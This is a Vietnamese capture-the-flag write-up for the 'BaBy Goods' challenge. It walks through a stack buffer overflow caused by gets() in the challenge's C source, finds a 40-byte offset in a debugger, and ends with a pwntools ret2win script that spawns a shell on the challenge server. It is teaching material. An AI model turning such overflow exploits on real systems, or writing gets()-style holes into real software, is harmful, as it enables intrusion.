# <center>BaBy Goods</center>
- Challenge cho ta 2 file gồm một file thực thi là ```babygoods``` và 1 file code **C** ```babygoods.c```
### Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char username[0x20];

int menu(char name[0x20]);

int sub_15210123() {
    execve("/bin/sh", 0, 0);
}

int buildpram() {
    char buf[0x10];
    char size[4];
    int num;

    printf("\nChoose the size of the pram (1-5): ");
    fgets(size,4,stdin);
    size[strcspn(size, "\r\n")] = '\0';
    num = atoi(size);
    if (1 > num || 5 < num) {
        printf("\nInvalid size!\n");
        return 0;
    }

    printf("\nYour pram has been created! Give it a name: ");
    //buffer overflow! user can pop shell directly from here
    gets(buf);
    printf("\nNew pram %s of size %s has been created!\n", buf, size);
    return 0;
}

int exitshop() {
    puts("\nThank you for visiting babygoods!\n");
    exit(0);
}

int menu(char name[0x20]) {
    char input[4];
    do {
        printf("\nHello %s!\n", name);
        printf("Welcome to babygoods, where we provide the best custom baby goods!\nWhat would you like to do today?\n");
        printf("1: Build new pram\n");
        printf("2: Exit\n");
        printf("Input: ");
        fgets(input, 4, stdin);
        input[strcspn(input, "\r\n")] = '\0';
        switch (atoi(input))
        {
        case 1:
            buildpram();
            break;
        default:
            printf("\nInvalid input!\n==========\n");
            menu(name);
        }
    } while (atoi(input) != 2);
    exitshop();
}

int main() {
        setbuf(stdin, 0);
        setbuf(stdout, 0);

    printf("Enter your name: ");
    fgets(username,0x20,stdin);
    username[strcspn(username, "\r\n")] = '\0';
    menu(username);
    return 0;
}
```
- Nhìn vào mã nguồn ta thấy lỗi rất rõ ở hàm ```buildpram()``` ở hàm ```gets(buf)``` cho phép nhận đầu vào không giới hạn dẫn đến lỗi ```Buffer Overflow``` cho phép ghi đè vào các bộ đệm lân cận. Xem các biện pháp bảo vệ của chương trình
```shellcode
gef➤  checksec
[+] checksec for '/home/s4ngxg/ctf/grey2024/distribution/babygoods'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
- ```Canary``` không được bật nên ta có thể khai thác lỗi ```Buffer Overflow```, ta thấy hàm ```sub_15210123()``` gọi shell trên hệ thống. Mục tiêu bây giờ là gì đè địa chỉ của hàm ```sub_15210123()``` vào địa chỉ trả về của hàm ```buildpram()```
- Debug để tìm các địa chỉ trả về của hàm ```buildpram()``` và địa chỉ bắt đầu của hàm ```sub_15210123()```
![image](https://hackmd.io/_uploads/B10akIqf0.png)
- Địa chỉ hàm ```sub_15210123()``` là ```0x401236```
![image](https://hackmd.io/_uploads/B1FybL5G0.png)
- Ta thấy sau khi gọi hàm ```buildpram()``` thì tới lệnh tiếp theo ở địa chỉ ```0x0000000000401404```, đó chính là địa chỉ trả về của hàm ```buildpram()```
- Đặt breakpoint ngay lệnh ```gets()``` và lệnh ```ret``` trong hàm  ```buildpram()``` để tìm địa chỉ trong stack và từ đó tìm được ofset
![image](https://hackmd.io/_uploads/H16o485M0.png)
Địa chỉ của biến ```buf``` trong stack là ```0x00007fffffffdfb0```
- ![image](https://hackmd.io/_uploads/SkH0VUqMC.png)
Địa chỉ của lệnh trả về trong stack là ```0x00007fffffffdfd8```
- Ofset là ```0x00007fffffffdfd8 - 0x00007fffffffdfb0 = 40 byte```

### Script
```python
from pwn import *

sub_address = 0x401236

p = remote('challs.nusgreyhats.org', 32345)

p.sendlineafter('name: ', b'S4nGxG')
p.sendlineafter('Input: ', b'1')
p.sendlineafter('(1-5): ', b'5')

payload = b'A'*40
payload += p64(sub_address)

p.sendlineafter('name: ', payload)

p.interactive()
```
> ##### *grey{4s_34sy_4s_t4k1ng_c4ndy_fr4m_4_b4by}*